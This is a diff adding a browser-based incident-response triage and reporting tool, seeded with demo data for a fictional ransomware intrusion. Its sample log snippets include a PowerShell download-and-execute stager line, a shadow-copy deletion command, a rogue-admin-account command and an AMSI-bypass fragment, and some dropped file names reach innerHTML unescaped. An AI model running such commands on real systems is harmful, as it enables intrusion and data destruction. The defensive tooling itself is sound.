+            <label class="block text-[10px] font-mono text-zinc-400 uppercase mb-1">LEAD IR RESPONDER</label>
+            <input id="meta-lead" type="text" value="K. Vance (Principal Threat Hunter)" class="w-full bg-[#0e120e] border border-[#253023] rounded px-2.5 py-1.5 text-xs font-mono text-white focus:outline-none focus:border-[#95D600]" />
+          </div>
+          <div>
+            <label class="block text-[10px] font-mono text-zinc-400 uppercase mb-1">THREAT ACTOR / CLUSTER</label>
+            <input id="meta-actor" type="text" value="UNC-7741 // VENOMLOCK" class="w-full bg-[#0e120e] border border-[#253023] rounded px-2.5 py-1.5 text-xs font-mono text-white focus:outline-none focus:border-[#95D600]" />
+          </div>
+          <div>
+            <label class="block text-[10px] font-mono text-zinc-400 uppercase mb-1">CONTAINMENT STATUS</label>
+            <select id="meta-status" class="w-full bg-[#0e120e] border border-[#253023] rounded px-2.5 py-1.5 text-xs font-mono font-bold text-[#39FF14] focus:outline-none focus:border-[#95D600]">
+              <option value="CONTAINED // ERADICATION IN PROGRESS">CONTAINED // ERADICATION ACTIVE</option>
+              <option value="ACTIVE INTRUSION // ISOLATING HOSTS">ACTIVE INTRUSION // ISOLATING</option>
+              <option value="ERADICATED // RECOVERY MONITORING">ERADICATED // MONITORING</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- 1. Executive Summary -->
+        <div class="space-y-2">
+          <div class="flex items-center justify-between">
+            <h3 class="font-display font-bold text-lg text-[#95D600] uppercase tracking-wider">
+              01. EXECUTIVE SUMMARY
+            </h3>
+            <span class="text-[11px] font-mono text-zinc-500 no-print">CLICK TEXT TO EDIT</span>
+          </div>
+          <textarea id="report-exec-summary" rows="4" class="w-full bg-[#080a08] border border-[#1f261e] focus:border-[#95D600] rounded-xl p-4 text-sm text-zinc-200 leading-relaxed focus:outline-none">On November 12, 2026, MONSTER // IR-OPS telemetry detected a multi-stage ransomware intrusion (Operation VenomLock) originating from a spear-phishing attachment delivered to Finance Workstation FIN-WKS-042. The adversary executed an obfuscated PowerShell downloader, established encrypted Command-and-Control (C2) communications with 185.220.101.44, dumped LSASS credentials, and attempted Volume Shadow Copy deletion via vssadmin.exe prior to EDR host isolation.</textarea>
+        </div>
+
+        <!-- 2. Scope & Evidence Inventory -->
+        <div class="space-y-3">
+          <h3 class="font-display font-bold text-lg text-[#95D600] uppercase tracking-wider">
+            02. FORENSIC EVIDENCE INVENTORY
+          </h3>
+          <div class="overflow-x-auto border border-[#1f261e] rounded-xl">
+            <table class="w-full text-left border-collapse text-xs font-mono">
+              <thead>
+                <tr class="bg-[#080a08] border-b border-[#1f261e] text-zinc-400">
+                  <th class="py-2.5 px-3">Artifact</th>
+                  <th class="py-2.5 px-3">Type</th>
+                  <th class="py-2.5 px-3">SHA-256 Digest</th>
+                  <th class="py-2.5 px-3">Classification</th>
+                </tr>
+              </thead>
+              <tbody id="report-evidence-tbody" class="divide-y divide-[#181f17] text-zinc-300">
+                <!-- Populated dynamically -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- 3. Verified Indicators of Compromise -->
+        <div class="space-y-3">
+          <h3 class="font-display font-bold text-lg text-[#95D600] uppercase tracking-wider">
+            03. VERIFIED INDICATORS OF COMPROMISE (IOCs)
+          </h3>
+          <div class="overflow-x-auto border border-[#1f261e] rounded-xl">
+            <table class="w-full text-left border-collapse text-xs font-mono">
+              <thead>
+                <tr class="bg-[#080a08] border-b border-[#1f261e] text-zinc-400">
+                  <th class="py-2.5 px-3">Type</th>
+                  <th class="py-2.5 px-3">Indicator Value</th>
+                  <th class="py-2.5 px-3">MITRE ATT&CK</th>
+                  <th class="py-2.5 px-3">Context / Threat Intel</th>
+                </tr>
+              </thead>
+              <tbody id="report-ioc-tbody" class="divide-y divide-[#181f17] text-zinc-300">
+                <!-- Populated dynamically -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- 4. Reconstructed Attack Timeline -->
+        <div class="space-y-3">
+          <h3 class="font-display font-bold text-lg text-[#95D600] uppercase tracking-wider">
+            04. RECONSTRUCTED ATTACK TIMELINE
+          </h3>
+          <div id="report-timeline-list" class="space-y-2.5">
+            <!-- Populated dynamically -->
+          </div>
+        </div>
+
+        <!-- 5. Containment & Remediation Checklist -->
+        <div class="space-y-3">
+          <div class="flex items-center justify-between">
+            <h3 class="font-display font-bold text-lg text-[#95D600] uppercase tracking-wider">
+              05. CONTAINMENT & REMEDIATION ACTION PLAN
+            </h3>
+            <span id="remediation-progress-label" class="text-xs font-mono text-[#95D600]">3 / 5 COMPLETED</span>
+          </div>
+          <div id="remediation-list" class="space-y-2">
+            <!-- Populated dynamically -->
+          </div>
+        </div>
+      </article>
+    </section>
+
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="border-t border-[#1c241b] bg-[#060706] py-4 px-6 text-center text-xs font-mono text-zinc-500 no-print">
+    MONSTER // IR-OPS — HIGH-VOLTAGE THREAT TRIAGE & REPORT SYNTHESIS ENGINE // UNLEASH THE RESPONSE
+  </footer>
+
+  <!-- ======================================================================= -->
+  <!-- APPLICATION LOGIC & STATE ENGINE                                        -->
+  <!-- ======================================================================= -->
+  <script>
+    // -------------------------------------------------------------------------
+    // 1. INITIAL DEMO SCENARIO DATA (Operation VenomLock)
+    // -------------------------------------------------------------------------
+    const INITIAL_STATE = {
+      currentView: 'ingest',
+      iocFilter: 'ALL',
+      artifacts: [
+        {
+          id: 'art-1',
+          filename: 'sysmon_FIN-WKS-042_ransom.evtx.json',
+          type: 'SYSMON TELEMETRY',
+          hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
+          severity: 'BEAST-TIER',
+          status: 'PARSED',
+          rawSnippet: 'ProcessCreate: vssadmin.exe delete shadows /all /quiet | Parent: powershell.exe | C2: 185.220.101.44'
+        },
+        {
+          id: 'art-2',
+          filename: 'Q4_WireTransfer_Invoice.eml',
+          type: 'EMAIL HEADERS',
+          hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
+          severity: 'CRITICAL',
+          status: 'PARSED',
+          rawSnippet: 'Return-Path: <billing@micros0ft-invoices-verify.com> | SPF: FAIL | Attachment SHA256: 4a8b9c...'
+        },
+        {
+          id: 'art-3',
+          filename: 'ps_operational_scriptblock_4104.log',
+          type: 'POWERSHELL LOG',
+          hash: '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae',
+          severity: 'BEAST-TIER',
+          status: 'PARSED',
+          rawSnippet: 'IEX (New-Object Net.WebClient).DownloadString("http://cdn-update-telemetry.xyz/stage2.ps1")'
+        }
+      ],
+      iocs: [
+        {
+          id: 'ioc-1',
+          type: 'IP',
+          value: '185.220.101.44',
+          mitre: 'T1071.001 // Web Protocols',
+          context: 'Primary Cobalt Strike C2 egress endpoint (Port 443)',
+          severity: 'BEAST-TIER',
+          included: true
+        },
+        {
+          id: 'ioc-2',
+          type: 'IP',
+          value: '91.214.124.88',
+          mitre: 'T1041 // Exfiltration Over C2',
+          context: 'Secondary staging server receiving archived finance shares',
+          severity: 'CRITICAL',
+          included: true
+        },
+        {
+          id: 'ioc-3',
+          type: 'DOMAIN',
+          value: 'cdn-update-telemetry.xyz',
+          mitre: 'T1105 // Ingress Tool Transfer',
+          context: 'Malicious payload hosting domain queried by PowerShell',
+          severity: 'BEAST-TIER',
+          included: true
+        },
+        {
+          id: 'ioc-4',
+          type: 'DOMAIN',
+          value: 'micros0ft-invoices-verify.com',
+          mitre: 'T1566.001 // Spearphishing Attachment',
+          context: 'Typosquatted sender domain bypassing DMARC policy',
+          severity: 'HIGH',
+          included: true
+        },
+        {
+          id: 'ioc-5',
+          type: 'HASH',
+          value: '4a8b9c2d1e0f7731a9c8e2b4d5f60192837465aabbccddeeff00112233445566',
+          mitre: 'T1059.001 // PowerShell',
+          context: 'VenomLock Dropper DLL (invoice_viewer.dll)',
+          severity: 'BEAST-TIER',
+          included: true
+        },
+        {
+          id: 'ioc-6',
+          type: 'HASH',
+          value: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
+          mitre: 'T1003.001 // LSASS Memory',
+          context: 'Custom credential dumper binary dropped in C:\\ProgramData\\',
+          severity: 'CRITICAL',
+          included: true
+        },
+        {
+          id: 'ioc-7',
+          type: 'DOMAIN',
+          value: 'api.beast-drop-relay.net',
+          mitre: 'T1573 // Encrypted Channel',
+          context: 'DNS-over-HTTPS fallback C2 channel',
+          severity: 'ELEVATED',
+          included: true
+        },
+        {
+          id: 'ioc-8',
+          type: 'IP',
+          value: '10.42.18.105',
+          mitre: 'T1021.002 // SMB/Windows Admin Shares',
+          context: 'Compromised internal pivot host (FIN-WKS-042)',
+          severity: 'CRITICAL',
+          included: true
+        }
+      ],
+      timeline: [
+        {
+          id: 'evt-1',
+          timestamp: '2026-11-12 14:08:19 UTC',
+          title: 'Spearphishing Email Delivered to FIN-WKS-042',
+          mitre: 'T1566.001',
+          severity: 'ELEVATED',
+          note: 'Spoofed invoice email bypassed perimeter gateway; user opened macro-enabled archive.',
+          included: true
+        },
+        {
+          id: 'evt-2',
+          timestamp: '2026-11-12 14:11:04 UTC',
+          title: 'Obfuscated PowerShell Stager Executed',
+          mitre: 'T1059.001',
+          severity: 'CRITICAL',
+          note: 'WINWORD.EXE spawned powershell.exe with -EncodedCommand pulling stage2.ps1 from cdn-update-telemetry.xyz.',
+          included: true
+        },
+        {
+          id: 'evt-3',
+          timestamp: '2026-11-12 14:14:52 UTC',
+          title: 'Outbound C2 Beacon Established (185.220.101.44)',
+          mitre: 'T1071.001',
+          severity: 'BEAST-TIER',
+          note: 'HTTPS beacon every 15s with jitter; confirmed Cobalt Strike malleable profile.',
+          included: true
+        },
+        {
+          id: 'evt-4',
+          timestamp: '2026-11-12 14:29:37 UTC',
+          title: 'LSASS Process Memory Credential Dumping',
+          mitre: 'T1003.001',
+          severity: 'CRITICAL',
+          note: 'Sysmon Event ID 10 detected GrantedAccess 0x1010 against lsass.exe; domain service account hash harvested.',
+          included: true
+        },
+        {
+          id: 'evt-5',
+          timestamp: '2026-11-12 14:41:11 UTC',
+          title: 'Shadow Copy Deletion Attempted (vssadmin.exe)',
+          mitre: 'T1490',
+          severity: 'BEAST-TIER',
+          note: 'Adversary ran "vssadmin delete shadows /all /quiet" to inhibit system recovery prior to encryption.',
+          included: true
+        },
+        {
+          id: 'evt-6',
+          timestamp: '2026-11-12 14:42:03 UTC',
+          title: 'Automated EDR Network Isolation Triggered',
+          mitre: 'CONTAINMENT',
+          severity: 'LOW',
+          note: 'Host FIN-WKS-042 quarantined from corporate VLAN; ransomware encryption binary halted before file lock.',
+          included: true
+        }
+      ],
+      remediation: [
+        { id: 'rem-1', text: 'Network-isolate host FIN-WKS-042 (10.42.18.105) via EDR containment policy.', done: true },
+        { id: 'rem-2', text: 'Block C2 IPs (185.220.101.44, 91.214.124.88) and domains at perimeter NGFW & DNS sinkhole.', done: true },
+        { id: 'rem-3', text: 'Force Kerberos TGT double-reset & password rotation for exposed Finance service accounts.', done: true },
+        { id: 'rem-4', text: 'Purge phishing email campaign across all Exchange mailboxes matching sender micros0ft-invoices-verify.com.', done: false },
+        { id: 'rem-5', text: 'Re-image FIN-WKS-042 from golden baseline after forensic disk acquisition completes.', done: false }
+      ]
+    };
+
+    // Deep clone helper for application state
+    let appState = JSON.parse(JSON.stringify(INITIAL_STATE));
+
+    // Sample Payloads for 1-Click Injectors
+    const SAMPLE_TEMPLATES = {
+      sysmon: {
+        filename: 'sysmon_DC01_lateral_move.evtx',
+        type: 'SYSMON TELEMETRY',
+        severity: 'BEAST-TIER',
+        rawSnippet: 'Sysmon Event 1: psexec.exe -> cmd.exe /c net user svc_backup P@ssw0rd2026! /add | SRC: 10.42.18.105 | C2: 45.133.1.99',
+        newIocs: [
+          { type: 'IP', value: '45.133.1.99', mitre: 'T1021 // Lateral Movement', context: 'Lateral SMB relay controller observed on DC01', severity: 'BEAST-TIER' }
+        ],
+        newEvent: {
+          timestamp: '2026-11-12 14:35:18 UTC',
+          title: 'Rogue Persistence Account Created on DC01',
+          mitre: 'T1136.001',
+          severity: 'BEAST-TIER',
+          note: 'Adversary created local backup administrator account "svc_backup" via PsExec.'
+        }
+      },
+      phishing: {
+        filename: 'URGENT_Audit_Notice_2026.eml',
+        type: 'EMAIL HEADERS',
+        severity: 'CRITICAL',
+        rawSnippet: 'Received: from mail.tax-compliance-portal.org (194.26.135.72) | DKIM: FAIL | URL: https://tax-compliance-portal.org/auth',
+        newIocs: [
+          { type: 'DOMAIN', value: 'tax-compliance-portal.org', mitre: 'T1566.002 // Spearphishing Link', context: 'Credential harvesting reverse-proxy infrastructure', severity: 'CRITICAL' },
+          { type: 'IP', value: '194.26.135.72', mitre: 'T1583.001 // Acquire Infrastructure', context: 'Originating SMTP relay for lure campaign', severity: 'HIGH' }
+        ],
+        newEvent: {
+          timestamp: '2026-11-12 13:54:02 UTC',
+          title: 'Initial Reconnaissance Phishing Wave Detected',
+          mitre: 'T1566.002',
+          severity: 'ELEVATED',
+          note: '4 employees received lure links pointing to tax-compliance-portal.org.'
+        }
+      },
+      powershell: {
+        filename: 'amsi_bypass_memory_dump.ps1',
+        type: 'POWERSHELL LOG',
+        severity: 'BEAST-TIER',
+        rawSnippet: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils") | C2: 198.51.100.214 | SHA256: 7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730',
+        newIocs: [
+          { type: 'HASH', value: '7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730', mitre: 'T1562.001 // Impair Defenses', context: 'AMSI memory patching shellcode loader', severity: 'BEAST-TIER' }
+        ],
+        newEvent: {
+          timestamp: '2026-11-12 14:12:30 UTC',
+          title: 'AMSI Defense Evasion Patch Injected',
+          mitre: 'T1562.001',
+          severity: 'CRITICAL',
+          note: 'In-memory reflection patched AmsiScanBuffer to return AMSI_RESULT_CLEAN.'
+        }
+      }
+    };
+
+    // -------------------------------------------------------------------------
+    // 2. UTILITY FUNCTIONS (Hashing, Toast Notifications, Navigation)
+    // -------------------------------------------------------------------------
+    async function computeSHA256(text) {
+      try {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(text);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+      } catch (e) {
+        // Fallback deterministic hex if SubtleCrypto unavailable in non-secure context
+        let h = 0x811c9dc5;
+        for (let i = 0; i < text.length; i++) {
+          h ^= text.charCodeAt(i);
+          h = Math.imul(h, 0x01000193);
+        }
+        return (h >>> 0).toString(16).padStart(64, 'a');
+      }
+    }
+
+    function showToast(message, type = 'neon') {
+      const container = document.getElementById('toast-container');
+      const toast = document.createElement('div');
+      const borderClass = type === 'danger' ? 'border-[#ff2a5f] text-[#ff2a5f]' : 'border-[#95D600] text-[#95D600]';
+      toast.className = `pointer-events-auto bg-[#0b0e0b]/95 backdrop-blur-md border ${borderClass} px-4 py-2.5 rounded-lg shadow-2xl font-mono text-xs flex items-center gap-2.5 transform transition-all duration-300 translate-y-2 opacity-0`;
+      toast.innerHTML = `<span class="w-2 h-2 rounded-full ${type === 'danger' ? 'bg-[#ff2a5f]' : 'bg-[#39FF14]'}"></span><span>${message}</span>`;
+      container.appendChild(toast);
+
+      requestAnimationFrame(() => {
+        toast.classList.remove('translate-y-2', 'opacity-0');
+      });
+
+      setTimeout(() => {
+        toast.classList.add('opacity-0', 'translate-y-2');
+        setTimeout(() => toast.remove(), 300);
+      }, 3000);
+    }
+
+    function appendTerminalLog(htmlLine) {
+      const term = document.getElementById('parser-terminal');
+      const div = document.createElement('div');
+      div.innerHTML = htmlLine;
+      term.appendChild(div);
+      term.scrollTop = term.scrollHeight;
+    }
+
+    function switchView(viewName) {
+      appState.currentView = viewName;
+      ['ingest', 'triage', 'report'].forEach(v => {
+        const section = document.getElementById(`view-${v}`);
+        const tab = document.getElementById(`tab-${v}`);
+        if (v === viewName) {
+          section.classList.remove('hidden');
+          tab.className = 'nav-tab flex-1 lg:flex-initial px-3.5 py-2.5 rounded-lg font-display font-bold text-xs sm:text-sm tracking-wider uppercase flex items-center justify-center gap-2 transition cursor-pointer border bg-[#95D600] text-black border-[#95D600] shadow-[0_0_16px_rgba(149,214,0,0.4)]';
+        } else {
+          section.classList.add('hidden');
+          tab.className = 'nav-tab flex-1 lg:flex-initial px-3.5 py-2.5 rounded-lg font-display font-bold text-xs sm:text-sm tracking-wider uppercase flex items-center justify-center gap-2 transition cursor-pointer border bg-[#0e120e] text-zinc-300 border-[#222b20] hover:border-[#95D600]/60 hover:text-white';
+        }
+      });
+
+      if (viewName === 'triage') renderTriageView();
+      if (viewName === 'report') renderReportView();
+    }
+
+    function syncIncidentBadge(val) {
+      document.getElementById('nav-incident-badge').textContent = `CASE: ${val || 'UNTITLED'}`;
+    }
+
+    // -------------------------------------------------------------------------
+    // 3. EVIDENCE INGESTION & REGEX IOC EXTRACTOR
+    // -------------------------------------------------------------------------
+    function extractIocsFromText(rawText, sourceName) {
+      const extracted = [];
+      // Extract IPv4 addresses
+      const ipRegex = /\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g;
+      const ips = [...new Set(rawText.match(ipRegex) || [])];
+      ips.forEach(ip => {
+        if (!ip.startsWith('127.') && !ip.startsWith('0.')) {
+          extracted.push({
+            type: 'IP',
+            value: ip,
+            mitre: 'T1071 // Application Layer Protocol',
+            context: `Extracted from ingested artifact: ${sourceName}`,
+            severity: 'CRITICAL'
+          });
+        }
+      });
+
+      // Extract SHA-256 Hashes
+      const sha256Regex = /\b[a-fA-F0-9]{64}\b/g;
+      const hashes = [...new Set(rawText.match(sha256Regex) || [])];
+      hashes.forEach(h => {
+        extracted.push({
+          type: 'HASH',
+          value: h.toLowerCase(),
+          mitre: 'T1204 // User Execution / Binary',
+          context: `Cryptographic hash parsed from ${sourceName}`,
+          severity: 'BEAST-TIER'
+        });
+      });
+
+      // Extract Domains (excluding common benign file extensions)
+      const domainRegex = /\b(?:[a-zA-Z0-9-]+\.)+(?:com|net|org|xyz|io|ru|cn|top|info|biz)\b/gi;
+      const domains = [...new Set(rawText.match(domainRegex) || [])];
+      domains.forEach(d => {
+        const lower = d.toLowerCase();
+        if (!['microsoft.com', 'google.com', 'w3.org'].includes(lower)) {
+          extracted.push({
+            type: 'DOMAIN',
+            value: lower,
+            mitre: 'T1568 // Dynamic Resolution',
+            context: `Suspicious domain indicator found in ${sourceName}`,
+            severity: 'HIGH'
+          });
+        }
+      });
+
+      return extracted;
+    }
+
+    async function addArtifactToLocker(filename, type, content, severity = 'CRITICAL', presetIocs = null, presetEvent = null) {
+      const hash = await computeSHA256(content + filename + Date.now());
+      const newArtifact = {
+        id: 'art-' + Date.now() + Math.random().toString(36).slice(2, 6),
+        filename,
+        type,
+        hash,
+        severity,
+        status: 'QUEUED',
+        rawSnippet: content.slice(0, 180),
+        presetIocs,
+        presetEvent
+      };
+
+      appState.artifacts.unshift(newArtifact);
+      renderIngestView();
+      appendTerminalLog(`<span class="text-[#95D600]">[INGEST]</span> Added <span class="text-white">${filename}</span> (${type}) — SHA256: ${hash.slice(0, 12)}...`);
+      showToast(`Artifact "${filename}" locked & hashed.`);
+    }
+
+    function injectSampleArtifact(sampleKey) {
+      const tpl = SAMPLE_TEMPLATES[sampleKey];
+      if (!tpl) return;
+      addArtifactToLocker(tpl.filename, tpl.type, tpl.rawSnippet, tpl.severity, tpl.newIocs, tpl.newEvent);
+    }
+
+    async function ingestPastedText() {
+      const textEl = document.getElementById('raw-paste-input');
+      const nameEl = document.getElementById('raw-paste-name');
+      const raw = textEl.value.trim();
+      if (!raw) {
+        showToast('Paste log lines, IPs, domains, or hashes first.', 'danger');
+        return;
+      }
+      const fname = nameEl.value.trim() || `manual_snippet_${appState.artifacts.length + 1}.log`;
+      await addArtifactToLocker(fname, 'RAW TELEMETRY', raw, 'HIGH');
+      textEl.value = '';
+      nameEl.value = '';
+    }
+
+    function handleFileSelect(event) {
+      const files = Array.from(event.target.files || []);
+      files.forEach(file => {
+        const reader = new FileReader();
+        reader.onload = async (e) => {
+          const text = String(e.target.result || '');
+          const ext = file.name.split('.').pop().toUpperCase();
+          await addArtifactToLocker(file.name, `${ext} FILE`, text, 'CRITICAL');
+        };
+        reader.readAsText(file);
+      });
+      event.target.value = '';
+    }
+
+    // Drag & Drop Listeners
+    const dropZone = document.getElementById('drop-zone');
+    dropZone.addEventListener('dragover', (e) => {
+      e.preventDefault();
+      dropZone.classList.add('border-[#95D600]', 'bg-[#121a11]');
+    });
+    dropZone.addEventListener('dragleave', () => {
+      dropZone.classList.remove('border-[#95D600]', 'bg-[#121a11]');
+    });
+    dropZone.addEventListener('drop', (e) => {
+      e.preventDefault();
+      dropZone.classList.remove('border-[#95D600]', 'bg-[#121a11]');
+      const files = Array.from(e.dataTransfer.files || []);
+      files.forEach(file => {
+        const reader = new FileReader();
+        reader.onload = async (ev) => {
+          const text = String(ev.target.result || '');
+          const ext = file.name.split('.').pop().toUpperCase();
+          await addArtifactToLocker(file.name, `${ext} ARTIFACT`, text, 'CRITICAL');
+        };
+        reader.readAsText(file);
+      });
+    });
+
+    function removeArtifact(id) {
+      appState.artifacts = appState.artifacts.filter(a => a.id !== id);
+      renderIngestView();
+      showToast('Artifact removed from locker.');
+    }
+
+    function clearAllArtifacts() {
+      appState.artifacts = [];
+      renderIngestView();
+      appendTerminalLog(`<span class="text-[#ff2a5f]">[PURGE]</span> Evidence Locker cleared by analyst.`);
+      showToast('Evidence Locker purged.', 'danger');
+    }
+
+    // -------------------------------------------------------------------------
+    // 4. "UNLEASH PARSER" ANIMATED EXECUTION PIPELINE
+    // -------------------------------------------------------------------------
+    function unleashParser() {
+      if (appState.artifacts.length === 0) {
+        showToast('Evidence Locker is empty! Inject a sample or drop a file first.', 'danger');
+        return;
+      }
+
+      const btn = document.getElementById('btn-unleash');
+      const bar = document.getElementById('parser-progress-bar');
+      const pct = document.getElementById('parser-percent');
+      const pill = document.getElementById('parser-status-pill');
+
+      btn.disabled = true;
+      btn.classList.add('opacity-60');
+      pill.textContent = 'OVERDRIVE // PARSING';
+      pill.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-[#39FF14]/20 text-[#39FF14] border border-[#39FF14] animate-pulse';
+
+      bar.style.width = '12%';
+      pct.textContent = '12%';
+      appendTerminalLog(`<span class="text-[#39FF14]">[EXEC]</span> Unleashing Beast-Mode Regex & Behavioral Parser on ${appState.artifacts.length} artifacts...`);
+
+      setTimeout(() => {
+        bar.style.width = '54%';
+        pct.textContent = '54%';
+        appendTerminalLog(`<span class="text-zinc-400">[SCAN]</span> Extracting IPv4s, C2 domains, SHA-256 digests, and MITRE ATT&CK signatures...`);
+      }, 320);
+
+      setTimeout(() => {
+        let addedIocCount = 0;
+        let addedEventCount = 0;
+
+        appState.artifacts.forEach(art => {
+          if (art.status !== 'PARSED') {
+            // Merge preset IOCs if sample, otherwise run regex extractor
+            const candidates = art.presetIocs || extractIocsFromText(art.rawSnippet, art.filename);
+            candidates.forEach(c => {
+              const exists = appState.iocs.some(existing => existing.value.toLowerCase() === c.value.toLowerCase());
+              if (!exists) {
+                appState.iocs.unshift({
+                  id: 'ioc-' + Date.now() + Math.random().toString(36).slice(2, 6),
+                  type: c.type,
+                  value: c.value,
+                  mitre: c.mitre,
+                  context: c.context,
+                  severity: c.severity || 'CRITICAL',
+                  included: true
+                });
+                addedIocCount++;
+              }
+            });
+
+            if (art.presetEvent) {
+              appState.timeline.push({
+                id: 'evt-' + Date.now() + Math.random().toString(36).slice(2, 6),
+                ...art.presetEvent,
+                included: true
+              });
+              addedEventCount++;
+            } else if (candidates.length > 0) {
+              appState.timeline.push({
+                id: 'evt-' + Date.now() + Math.random().toString(36).slice(2, 6),
+                timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
+                title: `Suspicious Telemetry Parsed in ${art.filename}`,
+                mitre: candidates[0].mitre.split(' ')[0],
+                severity: art.severity,
+                note: `Automated extraction flagged ${candidates.length} indicator(s): ${candidates.map(x => x.value).join(', ')}.`,
+                included: true
+              });
+              addedEventCount++;
+            }
+
+            art.status = 'PARSED';
+          }
+        });
+
+        bar.style.width = '100%';
+        pct.textContent = '100%';
+        pill.textContent = 'COMPLETE // SYNCED';
+        pill.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-[#95D600]/15 text-[#95D600] border border-[#95D600]/30';
+
+        btn.disabled = false;
+        btn.classList.remove('opacity-60');
+
+        renderIngestView();
+        appendTerminalLog(`<span class="text-[#95D600]">[DONE]</span> Synthesis complete! +${addedIocCount} new IOCs, +${addedEventCount} timeline events pushed to Triage Matrix.`);
+        showToast(`Parser Unleashed! ${appState.iocs.length} total IOCs ready in Triage.`);
+      }, 750);
+    }
+
+    // -------------------------------------------------------------------------
+    // 5. RENDERING FUNCTIONS FOR ALL 3 VIEWS
+    // -------------------------------------------------------------------------
+    function getSeverityBadgeHTML(sev) {
+      const map = {
+        'BEAST-TIER': 'bg-[#ff2a5f]/20 text-[#ff2a5f] border-[#ff2a5f]/50',
+        'CRITICAL': 'bg-[#ffb800]/20 text-[#ffb800] border-[#ffb800]/50',
+        'HIGH': 'bg-orange-500/20 text-orange-400 border-orange-500/40',
+        'ELEVATED': 'bg-[#95D600]/15 text-[#95D600] border-[#95D600]/40',
+        'LOW': 'bg-zinc-800 text-zinc-300 border-zinc-600'
+      };
+      const cls = map[sev] || map['ELEVATED'];
+      return `<span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold border uppercase print-badge ${cls}">${sev}</span>`;
+    }
+
+    function renderIngestView() {
+      document.getElementById('badge-artifact-count').textContent = appState.artifacts.length;
+      document.getElementById('badge-ioc-count').textContent = appState.iocs.length;
+      document.getElementById('queue-count-label').textContent = appState.artifacts.length;
+
+      const tbody = document.getElementById('evidence-table-body');
+      if (appState.artifacts.length === 0) {
+        tbody.innerHTML = `
+          <tr>
+            <td colspan="6" class="py-8 text-center font-mono text-xs text-zinc-500">
+              NO ARTIFACTS IN LOCKER — DROP FILES OR USE INSTANT SAMPLE INJECTORS ABOVE
+            </td>
+          </tr>`;
+        return;
+      }
+
+      tbody.innerHTML = appState.artifacts.map(art => `
+        <tr class="hover:bg-[#111610] transition">
+          <td class="py-3.5 px-4 font-mono text-xs text-white font-semibold">
+            <div class="flex items-center gap-2">
+              <span class="w-1.5 h-1.5 rounded-full bg-[#95D600]"></span>
+              <span>${escapeHtml(art.filename)}</span>
+            </div>
+          </td>
+          <td class="py-3.5 px-4 font-mono text-xs text-zinc-400">${escapeHtml(art.type)}</td>
+          <td class="py-3.5 px-4 font-mono text-xs text-zinc-500" title="${art.hash}">
+            ${art.hash.slice(0, 16)}...${art.hash.slice(-6)}
+          </td>
+          <td class="py-3.5 px-4">${getSeverityBadgeHTML(art.severity)}</td>
+          <td class="py-3.5 px-4 font-mono text-xs">
+            ${art.status === 'PARSED'
+              ? '<span class="text-[#39FF14] font-bold">✓ PARSED</span>'
+              : '<span class="text-[#ffb800] animate-pulse">● QUEUED</span>'}
+          </td>
+          <td class="py-3.5 px-4 text-right">
+            <button onclick="removeArtifact('${art.id}')" class="px-2.5 py-1 rounded bg-zinc-900 hover:bg-red-950/60 text-zinc-400 hover:text-[#ff2a5f] border border-zinc-800 text-xs font-mono transition cursor-pointer">
+              REMOVE
+            </button>
+          </td>
+        </tr>
+      `).join('');
+    }
+
+    function setIocFilter(filterType) {
+      appState.iocFilter = filterType;
+      document.querySelectorAll('.ioc-filter-btn').forEach(btn => {
+        if (btn.dataset.filter === filterType) {
+          btn.className = 'ioc-filter-btn px-2.5 py-1 rounded bg-[#95D600] text-black font-bold cursor-pointer';
+        } else {
+          btn.className = 'ioc-filter-btn px-2.5 py-1 rounded bg-zinc-900 text-zinc-300 border border-zinc-700 hover:border-[#95D600]/50 cursor-pointer';
+        }
+      });
+      renderTriageView();
+    }
+
+    function toggleIocInclusion(id) {
+      const item = appState.iocs.find(i => i.id === id);
+      if (item) {
+        item.included = !item.included;
+        renderTriageView();
+      }
+    }
+
+    function copyTextToClipboard(text) {
+      const textarea = document.createElement('textarea');
+      textarea.value = text;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
+      showToast(`Copied: ${text.slice(0, 36)}${text.length > 36 ? '...' : ''}`);
+    }
+
+    function renderTriageView() {
+      const includedIocs = appState.iocs.filter(i => i.included);
+      const includedEvents = appState.timeline.filter(e => e.included);
+      const uniqueMitre = new Set(includedIocs.map(i => i.mitre.split(' ')[0]));
+
+      document.getElementById('kpi-iocs').textContent = includedIocs.length;
+      document.getElementById('kpi-events').textContent = `${includedEvents.length} / ${appState.timeline.length}`;
+      document.getElementById('kpi-mitre').textContent = uniqueMitre.size;
+
+      // Render IOC Cards
+      const filteredIocs = appState.iocFilter === 'ALL'
+        ? appState.iocs
+        : appState.iocs.filter(i => i.type === appState.iocFilter);
+
+      const iocGrid = document.getElementById('ioc-grid');
+      iocGrid.innerHTML = filteredIocs.map(ioc => `
+        <div class="p-4 rounded-xl bg-[#090c09] border ${ioc.included ? 'border-[#253322]' : 'border-zinc-900 opacity-50'} flex flex-col justify-between gap-3 transition">
+          <div class="flex items-start justify-between gap-2">
+            <div class="space-y-1 min-w-0">
+              <div class="flex items-center gap-2">
+                <span class="px-2 py-0.5 rounded bg-[#95D600]/15 text-[#95D600] border border-[#95D600]/30 font-mono text-[10px] font-bold">
+                  ${ioc.type}
